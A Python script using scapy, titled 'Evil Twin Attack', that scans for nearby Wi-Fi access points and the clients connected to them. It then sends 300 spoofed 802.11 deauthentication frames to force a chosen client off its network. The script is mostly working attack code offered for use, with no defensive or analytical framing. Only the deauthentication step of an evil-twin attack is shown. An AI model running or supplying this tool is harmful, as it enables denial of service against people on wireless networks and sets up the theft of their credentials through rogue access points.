from scapy.all import * 
import os
import sys
#import _thread
#import time

iface = ""
users_list = []
ap_list = []
ap_mac = ""

def Wifi_scaning():
    print("Scanning for access points...")
    print("press CTRL+C to stop the scanning")
    print("index         MAC            SSID")
    sniff(iface = iface, prn = AP_handler)

def Users_scaning():
    print("Finds connected Clients")
    print ("index       Client MAC")
    sniff (iface = iface, prn = Users_handler)
     

def AP_handler(pkt) :
    global ap_list
    # if packet has 802.11 layer
    if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
            if pkt.addr2 not in ap_list:
                ap_list.append(pkt.addr2 )
                print(len(ap_list),'     %s     %s '%( pkt.addr2, pkt.info))



def Users_handler(pkt):
    global users_list
    if pkt.type == 2:
        if pkt.addr2 not in users_list and pkt.addr1 == ap_mac:
            users_list.append(pkt.addr2)
            print(len(users_list), pkt.addr2)
    


#Disconnects the target from the network
def DisConnectAttack(target_mac , gateway_mac, iface):
	dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
	# stack them up
	packet = RadioTap()/dot11/Dot11Deauth(reason=7)
	# send the packet
	sendp(packet, inter=0.1, count=300, iface=iface, verbose=1)


def main():
    global iface ,ap_mac
    print("********Evil Twin Attack*********")
    iface = input("please enter your interface: ")
    Wifi_scaning()
    # Choose wifi to attack
    if len(ap_list) > 0 :
        mac_adder = int(input("\nEnter the index of the ssid you want to attack: ")) -1
        ap_mac = ap_list[mac_adder]
        Users_scaning()
    #Choose user to attack
    if len(users_list) > 0 :
        user_adder = int(input("\nEnter the index of the client you want to attack: ")) -1
        user_mac = users_list[user_adder]
        DisConnectAttack(target_mac = user_mac , gateway_mac = ap_mac, iface = iface)


if __name__ == "__main__":
    main()